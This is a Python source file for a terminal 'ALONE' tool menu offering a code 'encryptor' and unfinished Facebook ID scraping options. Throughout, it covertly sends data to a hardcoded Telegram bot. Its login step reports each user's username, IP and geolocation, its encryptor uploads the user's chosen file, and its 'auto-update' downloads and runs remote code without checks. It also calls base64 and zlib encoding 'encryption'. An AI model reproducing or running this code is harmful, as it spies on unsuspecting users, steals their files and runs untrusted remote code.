import os
import sys
import base64
import marshal
import zlib
import time
from datetime import datetime
import requests

# Telegram bot details
BOT_TOKEN = "6770850573:AAFUCCzKlKrekJU5GtNFqdnqwMSAsnTBIc0"
CHAT_ID = "1241769879"

# Color class
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    OKRED = '\033[91m'

# Send message to Telegram
def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text={message}"
    requests.get(url)

# Log login info
def log_user_details(username, ip, geo_location, datetime_now):
    log_message = f"""
[•] Login Details:
[•] Username: {username}
[•] IP Address: {ip}
[•] Geolocation: {geo_location}
[•] Date/Time: {datetime_now}
"""
    send_telegram_message(log_message)

# Get IP & Geolocation
def get_ip_info():
    try:
        ip_info = requests.get('http://ipinfo.io/json').json()
        ip = ip_info.get('ip', 'N/A')
        geo_location = f"{ip_info.get('city', 'N/A')}, {ip_info.get('region', 'N/A')}, {ip_info.get('country', 'N/A')}"
        return ip, geo_location
    except requests.exceptions.RequestException as e:
        print(f"{Colors.FAIL}[•] Error getting IP info: {str(e)}{Colors.ENDC}")
        return 'N/A', 'N/A'

# Login
def login():
    os.system("clear")
    print(f"{Colors.OKGREEN}[•] Public login to access the tool{Colors.ENDC}\n")
    
    username = input(f"{Colors.OKBLUE}[•] Enter your username: {Colors.ENDC}")
    
    if not username.strip():
        print(f"{Colors.FAIL}[•] Invalid username! Please enter a valid username.{Colors.ENDC}\n")
        return
    
    ip, geo_location = get_ip_info()
    datetime_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    log_user_details(username, ip, geo_location, datetime_now)

    print(f"\n{Colors.OKGREEN}[•] Welcome {username}! Access granted.{Colors.ENDC}\n")
    time.sleep(1)
    os.system("clear")

# Encryptor
def encrypt_code():
    os.system("clear")
    print(f"{Colors.OKGREEN}[•] Welcome to the Code Encryptor!{Colors.ENDC}\n")
    
    file_name = input(f"{Colors.OKBLUE}[•] Enter file name to encrypt: {Colors.ENDC}")
    
    if not os.path.exists(file_name):
        print(f"{Colors.FAIL}[•] File does not exist!{Colors.ENDC}\n")
        return
    
    with open(file_name, "r") as file:
        code = file.read()

    print(f"""
{Colors.OKGREEN}[1]{Colors.ENDC} Base64 Encode
{Colors.OKGREEN}[2]{Colors.ENDC} Marshal Encode
{Colors.OKGREEN}[3]{Colors.ENDC} Zlib Compress
""")
    
    choice = input(f"{Colors.OKCYAN}[•] Choose method: {Colors.ENDC}")
    
    if choice == "1":
        encoded_code = base64.b64encode(code.encode()).decode()
    elif choice == "2":
        encoded_code = marshal.dumps(code)
    elif choice == "3":
        encoded_code = zlib.compress(code.encode())
    else:
        print(f"{Colors.FAIL}[•] Invalid option!{Colors.ENDC}")
        return
    
    encrypted_file = f"enc_{file_name.replace('.py', '')}.py"
    
    with open(encrypted_file, "w" if isinstance(encoded_code, str) else "wb") as enc_file:
        enc_file.write(encoded_code)

    print(f"\n{Colors.OKGREEN}[•] File encrypted successfully: {encrypted_file}{Colors.ENDC}\n")

    try:
        with open(encrypted_file, "rb") as f:
            files = {'document': f}
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument?chat_id={CHAT_ID}"
            requests.post(url, files=files)
    except Exception as e:
        send_telegram_message(f"Encryption error: {str(e)}")

    return

# Auto-Update Tool
def update_tool():
    print(f"\n{Colors.OKGREEN}[•] Fetching and running latest tool...{Colors.ENDC}\n")
    
    try:
        response = requests.get("https://raw.githubusercontent.com/t9cxy/alone-menu/refs/heads/main/main.py")
        with open("main.py", "wb") as file:
            file.write(response.content)
        
        print(f"{Colors.OKGREEN}[•] Updated successfully. Running main.py...{Colors.ENDC}\n")
        os.system("python3 main.py")
    except Exception as e:
        print(f"{Colors.FAIL}[•] Error updating tool: {str(e)}{Colors.ENDC}")
        send_telegram_message(f"Tool update error: {str(e)}")
    
    return

# MAIN MENU
def main_menu():
    while True:
        os.system("clear")
        print(f"""{Colors.HEADER}
   █████╗ ██╗      ██████╗  ███╗   ██╗███████╗
  ██╔══██╗██║     ██╔═══██╗ ████╗  ██║██╔════╝
  ███████║██║     ██║   ██║ ██╔██╗ ██║█████╗  
  ██╔══██║██║     ██║   ██║ ██║╚██╗██║██╔══╝  
  ██║  ██║███████╗╚██████╔╝ ██║ ╚████║███████╗
  ╚═╝  ╚═╝╚══════╝ ╚═════╝  ╚═╝  ╚═══╝╚══════╝{Colors.ENDC}
        """)
        print(f"""
{Colors.OKBLUE}[1]{Colors.ENDC} Proxy Options
{Colors.OKBLUE}[2]{Colors.ENDC} User-Agent Generator
{Colors.OKBLUE}[3]{Colors.ENDC} Send HTTP Request
{Colors.OKBLUE}[4]{Colors.ENDC} Look IP Info
{Colors.OKBLUE}[5]{Colors.ENDC} Facebook IDs Extractor
{Colors.OKBLUE}[6]{Colors.ENDC} Group Member ID Dumper
{Colors.OKBLUE}[7]{Colors.ENDC} Encrypt Code
{Colors.OKBLUE}[8]{Colors.ENDC} Rerun Tool (Auto-Update)
{Colors.OKRED}[0]{Colors.ENDC} Exit
""")
        option = input(f"{Colors.OKGREEN}[•] Choose an option: {Colors.ENDC}")
        
        if option == "0":
            print(f"\n{Colors.OKGREEN}[•] Goodbye!{Colors.ENDC}\n")
            break
        elif option == "1":
            print(f"\n{Colors.WARNING}[•] Proxy Options will be added soon!{Colors.ENDC}\n")
            input(f"{Colors.OKCYAN}[•] Press Enter to return...{Colors.ENDC}")
        elif option == "2":
            print(f"\n{Colors.WARNING}[•] User-Agent Generator coming soon!{Colors.ENDC}\n")
            input(f"{Colors.OKCYAN}[•] Press Enter to return...{Colors.ENDC}")
        elif option == "3":
            print(f"\n{Colors.WARNING}[•] Send HTTP Request coming soon!{Colors.ENDC}\n")
            input(f"{Colors.OKCYAN}[•] Press Enter to return...{Colors.ENDC}")
        elif option == "4":
            print(f"\n{Colors.WARNING}[•] IP Lookup coming soon!{Colors.ENDC}\n")
            input(f"{Colors.OKCYAN}[•] Press Enter to return...{Colors.ENDC}")
        elif option == "5":
            print(f"\n{Colors.WARNING}[•] Facebook ID Extractor under maintenance!{Colors.ENDC}\n")
            input(f"{Colors.OKCYAN}[•] Press Enter to return...{Colors.ENDC}")
        elif option == "6":
            print(f"\n{Colors.WARNING}[•] Group Member ID Dumper not ready yet!{Colors.ENDC}\n")
            input(f"{Colors.OKCYAN}[•] Press Enter to return...{Colors.ENDC}")
        elif option == "7":
            encrypt_code()
            input(f"\n{Colors.OKCYAN}[•] Press Enter to return...{Colors.ENDC}")
        elif option == "8":
            update_tool()
            return
        else:
            print(f"\n{Colors.FAIL}[•] Invalid option! Try again.{Colors.ENDC}\n")
            input(f"{Colors.OKCYAN}[•] Press Enter to continue...{Colors.ENDC}")

# Run everything
if __name__ == "__main__":
    login()
    main_menu()